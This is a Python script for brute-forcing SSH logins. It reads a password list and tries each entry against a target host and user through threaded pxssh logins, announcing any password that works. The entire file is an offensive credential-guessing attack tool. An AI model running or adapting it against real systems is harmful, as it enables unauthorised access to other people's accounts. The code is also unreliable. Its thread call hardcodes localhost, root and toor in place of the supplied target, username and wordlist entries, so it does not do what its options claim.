import os
import time
from pexpect import pxssh
from optparse import OptionParser
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

def connect(host, user, password, release):
    """
    Return SSH connection for given username@host -p password
    """
    global Found
    global Fails

    s = pxssh.pxssh()
    try:
        s.login(host, user, password)
        print("[+] Password found: " + password)
        Found = True
    except Exception as e:
        Fails += 1
        if 'read_nonblocking' in str(e):
            time.sleep(5)
        elif 'synchronize with original prompt' in str(e):
            time.sleep(1)
        if Fails < 5:
            connect(host, user, password, False)
        else:
            print("[!] Exiting: Too Many Socket Timeouts.")
    finally:
        if release:
            connection_lock.release()
    return s


if __name__ == "__main__":

    parser = OptionParser('usage %prog -H <target host> -u <username> -F <password lis>')
    parser.add_option('-H', dest='target_host', type=str, help='Specify target host.')
    parser.add_option('-u', dest='username', type=str, help='Specify account username.')
    parser.add_option('-F', dest='password_file', type=str, help='Specify file containing all possible passwords.')

    (options, args) = parser.parse_args()

    if options.target_host is None or options.username is None or options.password_file is None:
        print(parser.usage)
        exit(0)

    fn = open(options.password_file, "r")
    for line in fn.readlines():
        Fails = 0
        if Found:
            print("[*] Exiting: Password found")
            exit(0)
        connection_lock.acquire()
        password = line.strip("\r").strip("\n")
        print("[-] Testing: " + password)
        t = Thread(target=connect, args=("localhost", "root", "toor", True))
        child = t.start()

    print(options)
